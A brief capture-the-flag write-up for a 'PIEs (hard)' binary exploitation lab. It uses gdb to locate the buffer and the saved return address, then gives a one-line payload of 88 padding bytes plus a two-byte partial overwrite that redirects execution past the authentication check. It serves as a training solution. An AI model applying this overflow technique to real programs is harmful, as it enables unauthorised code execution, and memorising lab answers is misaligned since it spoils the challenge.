# PIEs (hard)

1. In gdb, `disas win_authed` and `disas main`, we get to know:
    - Instruction after auth check is at **0x174c**
    - challenge() returns at **0x19b9**

2. Set a breakpoint `b *challenge+158`, run and give a short string of a's as input
3. `info frame` -> rbp is at **0x7ffdcf51c100**
4. `x/100xg $rbp-200`:
    - input buffer starts at **0x7ffdcf51c0b0**, which is **rbp-0x50** = rbp-80
    - return address is stored at **0x7fffd6cd0ed8**, which is **rbp+0x8** = rbp+8
5. 88 a's followed by desired two bytes (one of the 4 nibbles is a guess, so have to run the exploit a few times):

    ```shell
    echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x4c\x17" | /challenge/binary-exploitation-pie-overflow 
    ```
